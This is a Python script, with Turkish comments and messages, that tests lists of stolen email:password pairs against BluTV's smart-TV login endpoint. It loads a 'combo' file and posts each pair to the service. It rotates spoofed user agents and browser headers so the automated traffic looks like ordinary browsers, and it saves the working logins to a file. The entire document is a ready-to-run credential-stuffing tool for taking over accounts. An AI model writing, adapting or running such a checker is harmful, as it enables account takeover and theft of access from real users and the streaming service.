import requests
import random
import os
import json
from cfonts import render
from tkinter import Tk, filedialog

# Renk kodları
KIRMIZI = '\033[1;31m'
MAVİ = '\033[1;36m'
YESIL = '\033[1;32m'
SIFIRLA = '\033[0m'

# Başlık
zenit = render('BLU-TV', colors=['white', 'blue'], align='center')
print(zenit)

# Dosya seçimi için tkinter kullanımı
root = Tk()
root.withdraw()  # Tk penceresini gizle
dosya_yolu = filedialog.askopenfilename(title="Bir dosya seçin", filetypes=[("Text files", "*.txt")])

# Seçilen dosya yolu boşsa işlemden çık
if not dosya_yolu:
    print(f"{KIRMIZI}Dosya seçilmedi, işlem iptal edildi.{SIFIRLA}")
    exit()

os.system('cls' if os.name == 'nt' else 'clear')
print(zenit)

# Kullanıcı ajanları listesi
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.34",
    "Mozilla/5.0 (Linux; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
]

try:
    with open(dosya_yolu, "r", encoding="utf-8") as dosya:
        hesaplar = [satir.strip() for satir in dosya if satir.strip() and ":" in satir]
except FileNotFoundError:
    print(f"{KIRMIZI} COMBO BULUNAMADİ KNK {SIFIRLA}")
    exit()
except UnicodeDecodeError:
    print(f"{KIRMIZI} Dosya kodlaması hatası, 'utf-8' ile okunamadı. Lütfen dosyanın kodlamasını kontrol edin. {SIFIRLA}")
    exit()

# Başarılı girişleri kaydetmek için dosya oluştur
basarili_dosya = "basarili_hesaplar.txt"

# BluTV hesap denetleyici döngüsü
for hesap in hesaplar:
    try:
        email, password = hesap.split(":", 1)
    except ValueError:
        print(f"{KIRMIZI} Hatalı format: {hesap} {SIFIRLA}")
        continue

    url = "https://smarttv.blutv.com.tr/actions/account/login"
    data = f"username={email}&password={password}&platform=com.blu.smarttv"

    headers = {
        "host": "smarttv.blutv.com.tr",
        "Content-Type": "application/x-www-form-urlencoded",
        "deviceid": "Windows:Chrome:94.0.4606.71",
        "deviceresolution": "1366x768",
        "origin": "https://www.blutv.com",
        "sec-ch-ua": 'Chromium;v=94, Google Chrome;v=94, ;Not A Brand;v=99',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": random.choice(user_agents)
    }

    try:
        response = requests.post(url, data=data, headers=headers)
        sonuc = response.text
        print("")
        print(f"{SIFIRLA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

        if '"status":"ok"' in sonuc:
            print(f"{YESIL}✅ Başarılı giriş: {email}:{password}{SIFIRLA}")
            with open(basarili_dosya, "a", encoding="utf-8") as dosya:
                dosya.write(f"{email}:{password}\n")
        else:
            print(f"{KIRMIZI}⛔ Başarısız giriş: {email}:{password}{SIFIRLA}")
    except Exception as e:
        print(f"{KIRMIZI}⛔ İP BAN VEYA İNTERNET YOK : {str(e)}{SIFIRLA}")
        
